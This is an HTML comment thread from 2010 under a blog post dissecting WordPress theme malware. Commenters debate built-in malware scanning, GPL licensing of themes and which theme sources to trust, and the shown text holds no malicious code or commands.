	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6073">
		<time itemprop="dateCreated" datetime="2010-12-10T02:41:34+00:00">December 10, 2010 at 2:41 am</time></a>	</div>

	<div itemprop="text"><p>Very comprehensive explanation, Otto.</p>
<p>It raises two issues, though. One from a non-too-technical perspective, the other from a more technical one.</p>
<p>The range of approved themes available via WordPress is not exactly what you&#8217;d call impressive and the majority look like they were designed back in WordPress 1.0 days. That pushes people like me into the wider marketplace.</p>
<p>Why not build Theme Check into the next service release of WP, not just be available as an option. It would then become a sort of charcoal filter for code before it was installed.</p>
<p>Its your job to ensure code stays poetry and not pornography.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6073#respond' onclick='return addComment.moveForm("div-comment-6073", "6073", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	<ul class="children">
	<li class="comment odd alt depth-2 parent" id="comment-6083" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6083" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/afe7acd32d014da2efcd6ee49d29ecc9?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://wank.wordpress.com' rel='external nofollow' class='url'>that girl again</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6083">
		<time itemprop="dateCreated" datetime="2010-12-10T15:00:27+00:00">December 10, 2010 at 3:00 pm</time></a>	</div>

	<div itemprop="text"><p>It would be great if some form of anti-virus could be included in core to protect end-users, but sadly I doubt this will happen. I have a bad feeling Matt would rather use this as part of his long-running crusade against non-GPL themes. It&#8217;s in his interests to scare people off downloading themes from third-party sites. I really hope I&#8217;m wrong, as in reality most users neither know nor care about malware or licensing issues, and hence aren&#8217;t going to protect themselves.</p>
<p>Also, it&#8217;s so hard to get a theme into the official directory these days, I&#8217;m not surprised most of them are by code monkeys rather than graphic designers and that their aesthetic qualities reflect this.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6083#respond' onclick='return addComment.moveForm("div-comment-6083", "6083", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	<ul class="children">
	<li class="comment byuser comment-author-otto bypostauthor even depth-3" id="comment-6084" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6084" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/0994d5e2e158a24ba8017c2525d78263?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://ottodestruct.com' rel='external nofollow' class='url'>Otto</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6084">
		<time itemprop="dateCreated" datetime="2010-12-10T15:08:33+00:00">December 10, 2010 at 3:08 pm</time></a>	</div>

	<div itemprop="text"><p>If there was some kind of malware checking in the core, then these spam authors would simply write their code to not be detected by it. There&#8217;s an infinite number of ways to hide things like this, you simply can&#8217;t catch them all and it doesn&#8217;t make any sense to get into an arms race over it.</p>
<p>Simply educating users about only downloading themes from trustworthy sites should be enough. Perhaps it isn&#8217;t.</p>
<p>Also, getting a theme into the official directory is a lot simpler. Use the <a href="http://wordpress.org/extend/plugins/theme-check/" rel="nofollow">Theme Check plugin</a> and fix the issues it lists before submitting your theme and it will be a lot more likely to pass review.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6084#respond' onclick='return addComment.moveForm("div-comment-6084", "6084", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="comment odd alt depth-3 parent" id="comment-6088" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6088" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://1.gravatar.com/avatar/1299e8d336a2d5faa4fc440d07ea44f8?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://www.chipbennett.net/' rel='external nofollow' class='url'>Chip Bennett</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6088">
		<time itemprop="dateCreated" datetime="2010-12-10T19:43:21+00:00">December 10, 2010 at 7:43 pm</time></a>	</div>

	<div itemprop="text"><p>Two days ago, I might have shared your view; however, considering that of the Themes distributed by sites from the first three pages of Google results for &#8220;Free WordPress Themes, <a href="http://bit.ly/fyxRKD" rel="nofollow">88% have SEO/spam links, 76% have base64 or other encoding, and at least 12% have some form of other malware</a>, I no longer agree.</p>
<p>This is no longer merely about a crusade against non-GPL Themes (although that, too, is an issue, since most of these sites also mis-apply licensing). This problem transcends the GPL-only issue. Users who look outside of official channels in order to find free WordPress Themes <em>will get</em> compromised Themes.</p>
<p>Also, I disagree completely that getting a Theme into the repository is unduly onerous. It might take a while, but that is a function of having an insufficient number of Theme reviewers.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6088#respond' onclick='return addComment.moveForm("div-comment-6088", "6088", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	<ul class="children">
	<li class="comment even depth-4 parent" id="comment-6105" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6105" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/afe7acd32d014da2efcd6ee49d29ecc9?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://wank.wordpress.com' rel='external nofollow' class='url'>that girl again</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6105">
		<time itemprop="dateCreated" datetime="2010-12-11T15:54:37+00:00">December 11, 2010 at 3:54 pm</time></a>	</div>

	<div itemprop="text"><blockquote><p>This problem transcends the GPL-only issue. Users who look outside of official channels in order to find free WordPress Themes will get compromised Themes.</p></blockquote>
<p>Well, if GPL were not such a religious issue then people wouldn&#8217;t be being driven beyond the official repository to find themes, because wordpress.org would be open to a much wider range of work. It would be possible to vet non-GPL theme developers and link to reputable ones from wordpress.org, in the same way as currently happens with commercial themes. Security <em>ought</em> to transcend GPL-zealotry, but, again, I&#8217;m not convinced it will.</p>
<p>And as for getting into an arms race, I was under the impression that was an inevitable consequence of trying to deal with spam and malware. It&#8217;s all very well to say that people who go off-piste looking for a theme forfeit the right to protection, but you need to bear in mind that if they do get hacked, they&#8217;re probably going to blame wordpress rather than their theme, and ultimately that&#8217;s going to be bad for wordpress.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6105#respond' onclick='return addComment.moveForm("div-comment-6105", "6105", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	<ul class="children">
	<li class="comment byuser comment-author-otto bypostauthor odd alt depth-5 parent" id="comment-6106" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6106" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/0994d5e2e158a24ba8017c2525d78263?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://ottodestruct.com' rel='external nofollow' class='url'>Otto</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6106">
		<time itemprop="dateCreated" datetime="2010-12-11T16:12:59+00:00">December 11, 2010 at 4:12 pm</time></a>	</div>

	<div itemprop="text"><p>WTF are you talking about? This has nothing to do with the GPL at all.</p>
<p>If you don&#8217;t want to release a theme you created under the GPL, then don&#8217;t. That has nothing to do with spam and malicious software.</p>
<p>And no, we&#8217;re not going to allow non-GPL software onto WordPress.org. In fact, we go even further and don&#8217;t allow any *paid* software onto WordPress.org either. WordPress is free and it will remain so.</p>
<p>If you want to play in the sandbox with the other kids, then you obey the rules like everybody else does. That&#8217;s not zealotry; that&#8217;s standing by a set of principles.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6106#respond' onclick='return addComment.moveForm("div-comment-6106", "6106", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	<ul class="children">
	<li class="comment even depth-6 parent" id="comment-6158" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6158" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/afe7acd32d014da2efcd6ee49d29ecc9?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://wank.wordpress.com' rel='external nofollow' class='url'>that girl again</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6158">
		<time itemprop="dateCreated" datetime="2010-12-13T17:10:45+00:00">December 13, 2010 at 5:10 pm</time></a>	</div>

	<div itemprop="text"><blockquote><p>If you don’t want to release a theme you created under the GPL, then don’t. That has nothing to do with spam and malicious software.</p></blockquote>
<p>Then maybe you guys should stop running around claiming that any free theme not hosted by wordpress.org is going to compromise your wordpress install. As far as I can tell, the problem is with third-party repositories collating themes by a variety of authors and injecting their code into it. Do you have any examples of a theme obtained direct from the author which pulls this crap? I&#8217;d genuinely like to know.</p>
<blockquote><p>In fact, we go even further and don’t allow any *paid* software onto WordPress.org either</p></blockquote>
<p>um, what about <a href="http://wordpress.org/extend/themes/commercial/" rel="nofollow">http://wordpress.org/extend/themes/commercial/</a> ? I wasn&#8217;t talking about hosting (I wouldn&#8217;t presume to tell Matt what to put on his servers); I was talking about <em>linking</em>, and how it might help to keep people away from disreputable sites by directing them towards trustworthy ones. </p>
<p>It&#8217;s just massively illogical to equate somebody like <a href="http://wpthemes.info/license-info/" rel="nofollow">Sadish</a> (who has been doing this for years, has a theme in use on wordpress.com and distributes only through his own site) with the second-hand theme warehouses which exist only to propagate spam. If the &#8216;non-GPL = evil&#8217; mindset is just too deep to overcome and there&#8217;s no way you can tell people what third-party sites they can trust, could you not at least publish some form of watchlist advising users which sites to avoid?</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6158#respond' onclick='return addComment.moveForm("div-comment-6158", "6158", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	<ul class="children">
	<li class="comment byuser comment-author-otto bypostauthor odd alt depth-7" id="comment-6174" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6174" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/0994d5e2e158a24ba8017c2525d78263?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://ottodestruct.com' rel='external nofollow' class='url'>Otto</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6174">
		<time itemprop="dateCreated" datetime="2010-12-14T14:31:23+00:00">December 14, 2010 at 2:31 pm</time></a>	</div>

	<div itemprop="text"><p>I don&#8217;t see where I said any such thing about all other theme sites being bad. Certainly that&#8217;s not the case.</p>
<p>MOST of them are bad. Not &#8220;all&#8221;.</p>
<p>But don&#8217;t take my word for it. Argue with <a href="http://www.chipbennett.net/2010/12/10/only-download-wordpress-themes-from-trusted-sources/" rel="nofollow">Chip&#8217;s statistics on the matter</a>.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6174#respond' onclick='return addComment.moveForm("div-comment-6174", "6174", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
	<li class="comment even depth-5 parent" id="comment-6108" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6108" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://1.gravatar.com/avatar/1299e8d336a2d5faa4fc440d07ea44f8?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://www.chipbennett.net/' rel='external nofollow' class='url'>Chip Bennett</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6108">
		<time itemprop="dateCreated" datetime="2010-12-11T17:46:23+00:00">December 11, 2010 at 5:46 pm</time></a>	</div>

	<div itemprop="text"><p>I&#8217;m sure you know my opinion on the GPL-inheritance issue; that said, I have no problem whatsoever with the WordPress.org Theme Repository requiring hosted Themes to be 100% GPL-compatible.</p>
<p>To be honest: I have yet to find a non-commercial Theme submitted under a non-GPL license that <em>wasn&#8217;t</em> compromised in some fashion. Most Themes that are GPL generally wind up in the Repository (that backend-search exposure is a pretty darn big incentive). The one exception I&#8217;ve found is Leland&#8217;s Themes at ThemeLab. I don&#8217;t know if I would trust any other extra-repository, free-Theme distributor.</p>
<p>Given the state of the free-Theme environment right now, I am fairly confident in saying: buy a commercial Theme from a reputable developer, or get a free Theme from within the WordPress.org Repository. Anything else, and you will almost certainly get a compromised Theme.</p>
<p>I&#8217;m wondering if it would be possible to develop some sort of WPORG-hosted digital-signature database against which to verify Themes? </p>
<p>Outside of that, Theme developers are going to have to start looking at registering their Theme names as Trademarks, and then enforcing those Trademarks. Unfortunately, this route is very likely prohibitively expensive for free-Theme developers.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6108#respond' onclick='return addComment.moveForm("div-comment-6108", "6108", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	<ul class="children">
	<li class="comment odd alt depth-6" id="comment-6118" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6118" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/a084125c824d274ff40cb834cf9f544a?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://pixopoint.com/' rel='external nofollow' class='url'>Ryan</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6118">
		<time itemprop="dateCreated" datetime="2010-12-12T04:15:23+00:00">December 12, 2010 at 4:15 am</time></a>	</div>

	<div itemprop="text"><p>Ohhh, burn on the non-repo free themes! LOL.</p>
<p>&#8230; I have non repo hosted free themes <img src="http://ottopress.com/wp-content/plugins/classic-smilies/img/icon_razz.gif" alt=":P" class="wp-smiley" /> </p>
<p>Oh, and thanks for the writeup Otto! Fascinating to hear how these evil little buggers get their spammy crap into WordPress installs.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6118#respond' onclick='return addComment.moveForm("div-comment-6118", "6118", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
	<li class="comment even thread-even depth-1" id="comment-6074" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6074" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://1.gravatar.com/avatar/529b2aac5690619ae7bdc5f5aca1e11d?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://merchboer.nl' rel='external nofollow' class='url'>Richard</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6074">
		<time itemprop="dateCreated" datetime="2010-12-10T03:19:55+00:00">December 10, 2010 at 3:19 am</time></a>	</div>

	<div itemprop="text"><p>props for the Cro Mags favicon and Biohazard logo in the post!</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6074#respond' onclick='return addComment.moveForm("div-comment-6074", "6074", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-6075" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6075" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/45903c2f71bc776aedbe347987393c76?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://cordobo.com/' rel='external nofollow' class='url'>Andreas Jacob</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6075">
		<time itemprop="dateCreated" datetime="2010-12-10T05:05:48+00:00">December 10, 2010 at 5:05 am</time></a>	</div>

	<div itemprop="text"><p>Looks like one of my wordpress themes (green park 2) has been altered as well. Thanks for your extensive write-up.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6075#respond' onclick='return addComment.moveForm("div-comment-6075", "6075", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="comment even thread-even depth-1" id="comment-6077" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6077" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/81717a172b6918071fbea1a52483294b?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://dougal.gunters.org' rel='external nofollow' class='url'>Dougal Campbell</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6077">
		<time itemprop="dateCreated" datetime="2010-12-10T08:31:21+00:00">December 10, 2010 at 8:31 am</time></a>	</div>

	<div itemprop="text"><p>Nice analysis! And I didn&#8217;t even realize that PHP had a <code>pack()</code> function, though I&#8217;ve used it a lot in Perl over the years. I used to use it for formatting binary data to send/receive data to a mainframe interface on a trucking company website <img src="http://ottopress.com/wp-content/plugins/classic-smilies/img/icon_smile.gif" alt=":)" class="wp-smiley" /> </p>
<p>Anyhow, that&#8217;s definitely a clever, devious, smart bit of ugliness there. If only the author would use his powers for Good!</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6077#respond' onclick='return addComment.moveForm("div-comment-6077", "6077", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback odd alt thread-odd thread-alt depth-1" id="comment-6081" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6081" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://weblogtoolscollection.com/archives/2010/12/10/theme-malware-anatomy/' rel='external nofollow' class='url'>Theme Malware Anatomy &laquo; Weblog Tools Collection</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6081">
		<time itemprop="dateCreated" datetime="2010-12-10T14:00:39+00:00">December 10, 2010 at 2:00 pm</time></a>	</div>

	<div itemprop="text"><p>[...] does a great job going in-depth and explaining exactly how this particular piece of theme malware works. Most of the explanation is over my head but it gives [...]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6081#respond' onclick='return addComment.moveForm("div-comment-6081", "6081", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback even thread-even depth-1" id="comment-6102" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6102" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://wordcastnet.com/news/2010/12/11/wordpress-theme-malware-prevention-and-protection.html' rel='external nofollow' class='url'>WordPress Theme Malware Prevention and Protection | Blogging News, WordPress News, Social Media News from WordCast</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6102">
		<time itemprop="dateCreated" datetime="2010-12-11T13:05:35+00:00">December 11, 2010 at 1:05 pm</time></a>	</div>

	<div itemprop="text"><p>[...] Theme loaded with malware was uncovered. Otto wrote up a dissection of the Theme in &#8220;Anatomy of a Theme Malware,&#8221; giving programmers, developers, and WordPress Theme hosts an inside look at the insidious [...]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6102#respond' onclick='return addComment.moveForm("div-comment-6102", "6102", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback odd alt thread-odd thread-alt depth-1" id="comment-6103" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6103" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://lorelle.wordpress.com/2010/12/11/malware-found-in-wordpress-theme-protect-yourself-now/' rel='external nofollow' class='url'>Malware Found in WordPress Theme &#8211; Protect Yourself Now &laquo; Lorelle on WordPress</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6103">
		<time itemprop="dateCreated" datetime="2010-12-11T13:43:54+00:00">December 11, 2010 at 1:43 pm</time></a>	</div>

	<div itemprop="text"><p>[...] I&#8217;ve just published &#8220;WordPress Theme Malware Prevention and Protection on WordCast, covering the recent WordPress Theme dissection of malware by Otto. [...]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6103#respond' onclick='return addComment.moveForm("div-comment-6103", "6103", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback even thread-even depth-1" id="comment-6115" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6115" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://journeymanjourneys.com/wordpress-malware-themes' rel='external nofollow' class='url'>WordPress Malware in Themes | Journeyman Journeys ™</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6115">
		<time itemprop="dateCreated" datetime="2010-12-12T01:02:16+00:00">December 12, 2010 at 1:02 am</time></a>	</div>

	<div itemprop="text"><p>[...] old adage: “Too good to be true”, plays out in the inter­net world as well.Here’s an excel­lent expla­na­tion of how spam­mers use Word­Press theme to spread their malware.How do you avoid get­ting Word­Press Theme malwareAlways get free theme [...]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6115#respond' onclick='return addComment.moveForm("div-comment-6115", "6115", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-6122" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6122" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/820d0e4ee14e986a44d33782ca852f51?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name">bob</cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6122">
		<time itemprop="dateCreated" datetime="2010-12-12T06:44:59+00:00">December 12, 2010 at 6:44 am</time></a>	</div>

	<div itemprop="text"><p>that site has been around a very long time offering theme downloads with modifiled functions.php files.<br />
I even notified one of the original theme authors, at least 12-14 months ago</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6122#respond' onclick='return addComment.moveForm("div-comment-6122", "6122", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="comment even thread-even depth-1" id="comment-6126" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6126" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/2342de806f6b7ebc450c2b6c5046022b?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://www.blog.web6.org' rel='external nofollow' class='url'>Kimi</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6126">
		<time itemprop="dateCreated" datetime="2010-12-12T11:17:24+00:00">December 12, 2010 at 11:17 am</time></a>	</div>

	<div itemprop="text"><p>Otto,</p>
<p>Just came from Lorelle&#8217;s page, first time here.</p>
<p>In my blog&#8217;s niche, almost 99% my readers are wordpress beginners, i am very happy to always remind them to download clean free themes that they can access from dashboard.</p>
<p>I am so happy i did write it almost on all my posts which are themes related.</p>
<p>Thanks to bring it up, great reminder.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6126#respond' onclick='return addComment.moveForm("div-comment-6126", "6126", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="comment odd alt thread-odd thread-alt depth-1 parent" id="comment-6136" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6136" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://1.gravatar.com/avatar/9ea04cc845c7cb426fceafbe4ff2e9ed?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name">Robert</cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6136">
		<time itemprop="dateCreated" datetime="2010-12-12T21:09:53+00:00">December 12, 2010 at 9:09 pm</time></a>	</div>

	<div itemprop="text"><p>I just still wondering why top-themes(<a href="http://www.top-themes.com/" rel="nofollow">http://www.top-themes.com/</a>) still active.I tested to download some of the theme and it still have the blocks of functions/codes there.They can distribute those themes with malware if they can still operate.If all of the themes on that site contain basically the same code, why wordpress allow this site to continously distribute infected themes.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6136#respond' onclick='return addComment.moveForm("div-comment-6136", "6136", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	<ul class="children">
	<li class="comment even depth-2 parent" id="comment-6137" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6137" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://1.gravatar.com/avatar/1299e8d336a2d5faa4fc440d07ea44f8?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://www.chipbennett.net/' rel='external nofollow' class='url'>Chip Bennett</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6137">
